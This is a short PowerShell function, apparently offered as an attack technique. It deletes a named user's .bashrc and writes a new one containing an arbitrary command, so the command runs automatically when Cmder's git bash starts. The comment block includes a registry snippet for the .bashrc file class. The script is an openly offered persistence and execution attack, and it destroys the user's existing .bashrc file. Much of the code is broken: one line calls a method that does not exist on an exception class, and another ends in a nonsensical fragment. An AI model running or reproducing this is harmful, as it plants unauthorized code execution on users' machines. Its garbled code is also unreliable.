function invoke-Execution {
<#
  <!>
  Author @matthomjxi0e ( Matt homjxie )
  
  subject execute Automatic in System using B-H.exe in Powershell

  
  .Description This Execution Automatic in Powershell using B-H in Cmde/Framework this the 
   execution, Via getconsole object in B-H in Cmder/Framwork ========> next ! ! ! ! ! ! ! !



  .Example PS:> invoke-Execution -Command calc -User Giahd
  <!>


  can you look to this to know how work this The Execution Automatic
 
@@">

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\.bashrc]
@="bashrc_auto_file"


@@<"



#>


param(

   $Command, $User

)



$gofile_Create = cd C:\Users\$User



  $rmfile = Powershell.exe rm C:\Users\$User\.bashrc 



$Createexecute = Write-Host -Object ( New-Item -Path C:\Users\$User\ -Name .bashrc -Value $Command )



powershell -Command (New-Object System.ExecutionEngineException).runstring ("$Execute function Run {$executerun C:\Users\$User\Desktop\Cmder\vendor\git-for-windows\bin\bash.exe} Run")*Powershell*sleep 0+;;;;''''    

.\powershell.exe
}
